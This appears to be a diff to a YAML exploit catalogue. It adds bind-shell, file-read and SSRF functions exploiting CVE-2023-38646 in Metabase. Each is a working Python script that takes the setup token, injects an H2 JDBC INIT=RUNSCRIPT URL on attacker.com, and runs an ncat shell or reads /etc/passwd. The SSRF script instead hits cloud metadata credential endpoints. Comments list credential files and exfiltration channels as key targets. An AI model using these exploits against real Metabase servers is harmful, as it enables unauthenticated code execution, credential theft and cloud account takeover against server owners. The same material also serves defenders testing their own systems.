@@ -27,6 +27,98 @@ docker:
 
     '
 functions:
+  bind-shell:
+  - code: |
+      #!/usr/bin/env python3
+      # CVE-2023-38646: bind shell via H2 Java method binding
+      # Host bind.sql on attacker machine (python3 -m http.server 8888)
+      # bind.sql content:
+      #   CREATE ALIAS IF NOT EXISTS EXEC AS $$ String exec(String[] c)
+      #   throws Exception { Runtime.getRuntime().exec(c); return null; }$$;
+      #   CALL EXEC(ARRAY['/bin/sh', '-c', 'ncat -lvp 12345 -e /bin/sh &']);
+
+      import requests
+
+      BASE         = "http://victim.com"
+      BIND_SQL_URL = "http://attacker.com:8888/bind.sql"
+
+      token = requests.get(f"{BASE}/api/session/properties").json()["setup-token"]
+
+      jdbc = (
+          "zip:./metabase.jar!/sample-database.db"
+          ";TRACE_LEVEL_SYSTEM_OUT=3"
+          f";INIT=RUNSCRIPT FROM '{BIND_SQL_URL}'"
+      )
+      requests.post(f"{BASE}/api/setup/validate", json={
+          "token": token,
+          "details": {
+              "is_full_sync": True, "is_on_demand": False, "name": "x",
+              "engine": "h2", "details": {"db": jdbc}
+          }
+      })
+    comment: |
+      CVE-2023-38646: opens a bind shell on TCP 12345 via H2 Java method binding.
+      The ncat process is detached with & so the HTTP request completes normally.
+      Connect with: nc victim.com 12345
+      Requires ncat on the Metabase host. The shell runs as the Metabase process user
+      (commonly metabase or root in containerised deployments).
+    connector: tcp-client
+    contexts:
+      unauthenticated:
+    tty: false
+    version: |
+      open source < 0.46.6.1 / Enterprise < 1.46.6.1
+  file-read:
+  - code: |
+      #!/usr/bin/env python3
+      # CVE-2023-38646: read files via H2 CSVREAD in the JDBC INIT parameter
+      # Host a file-read SQL script on the attacker machine:
+      # read.sql content:
+      #   CREATE ALIAS IF NOT EXISTS FILE_READ AS $$
+      #   String fileRead(String f) throws Exception {
+      #     return new java.util.Scanner(new java.io.File(f)).useDelimiter("\\A").next();
+      #   }$$;
+      #   CALL FILE_READ('/etc/passwd');
+      #
+      # python3 -m http.server 8888
+
+      import requests
+
+      BASE         = "http://victim.com"
+      READ_SQL_URL = "http://attacker.com:8888/read.sql"
+
+      token = requests.get(f"{BASE}/api/session/properties").json()["setup-token"]
+
+      jdbc = (
+          "zip:./metabase.jar!/sample-database.db"
+          ";TRACE_LEVEL_SYSTEM_OUT=3"
+          f";INIT=RUNSCRIPT FROM '{READ_SQL_URL}'"
+      )
+      resp = requests.post(f"{BASE}/api/setup/validate", json={
+          "token": token,
+          "details": {
+              "is_full_sync": True,
+              "is_on_demand": False,
+              "name": "x",
+              "engine": "h2",
+              "details": {"db": jdbc}
+          }
+      })
+      print(resp.text)
+    comment: |
+      CVE-2023-38646: reads arbitrary server-side files via H2's Java method binding.
+      The FILE_READ alias uses java.util.Scanner to read the entire file.
+      File content appears in the Metabase server logs (TRACE_LEVEL_SYSTEM_OUT=3)
+      and partially in the API error response. For reliable output, write to a
+      network share or send via DNS/HTTP callback from within the SQL.
+      Key targets:
+      - /etc/passwd, /proc/1/environ (system information, credentials in environment)
+      - /opt/metabase/metabase.db.mv.db or equivalent H2 database file
+      - Application config files containing API keys and database credentials
+    contexts:
+      unauthenticated:
+    version: |
+      open source < 0.46.6.1 / Enterprise < 1.46.6.1
   rce:
   - blind: true
     code: |
@@ -116,5 +208,33 @@ functions:
     listener: tcp-server
     tty: false
     version: |-
+      open source < 0.46.6.1 / Enterprise < 1.46.6.1
+  ssrf:
+  - code: "# CVE-2023-38646: SSRF via H2 JDBC INIT with RUNSCRIPT FROM attacker URL\n\
+      # The INIT parameter fetches the SQL file from a URL \u2014 the request originates\n\
+      # from the Metabase server, probing any URL reachable from it.\nimport requests\n\
+      \nBASE = \"http://victim.com\"\n\ntoken = requests.get(f\"{BASE}/api/session/properties\"\
+      ).json()[\"setup-token\"]\n\n# Use an internal URL as the RUNSCRIPT target \u2014\
+      \ the Metabase server fetches it:\njdbc = (\n    \"zip:./metabase.jar!/sample-database.db\"\
+      \n    \";TRACE_LEVEL_SYSTEM_OUT=3\"\n    \";INIT=RUNSCRIPT FROM 'http://169.254.169.254/latest/meta-data/iam/security-credentials/'\"\
+      \n)\nresp = requests.post(f\"{BASE}/api/setup/validate\", json={\n    \"token\"\
+      : token,\n    \"details\": {\n        \"is_full_sync\": True, \"is_on_demand\"\
+      : False, \"name\": \"x\",\n        \"engine\": \"h2\", \"details\": {\"db\"\
+      : jdbc}\n    }\n})\n# The server-side HTTP error (non-SQL response from the\
+      \ metadata endpoint)\n# appears in the response or logs, confirming the outbound\
+      \ request was made.\nprint(resp.text)\n"
+    comment: "CVE-2023-38646: the H2 JDBC INIT=RUNSCRIPT FROM parameter fetches a\
+      \ SQL file from\na URL server-side. Supplying an internal URL causes the Metabase\
+      \ server to make an\noutbound HTTP GET to the target, probing internal services\
+      \ or cloud metadata endpoints.\nThe HTTP response is parsed as SQL \u2014 any\
+      \ non-SQL response produces an error that\nmay partially reflect the response\
+      \ body, making this a semi-blind SSRF.\nFor more reliable extraction, host an\
+      \ attacker HTTP server and observe incoming requests.\nCloud metadata endpoints:\n\
+      - AWS IMDSv1: http://169.254.169.254/latest/meta-data/iam/security-credentials/\n\
+      - GCP:        http://metadata.google.internal/computeMetadata/v1/\n- Azure:\
+      \      http://169.254.169.254/metadata/instance?api-version=2021-02-01\n"
+    contexts:
+      unauthenticated:
+    version: |
       open source < 0.46.6.1 / Enterprise < 1.46.6.1
 ...
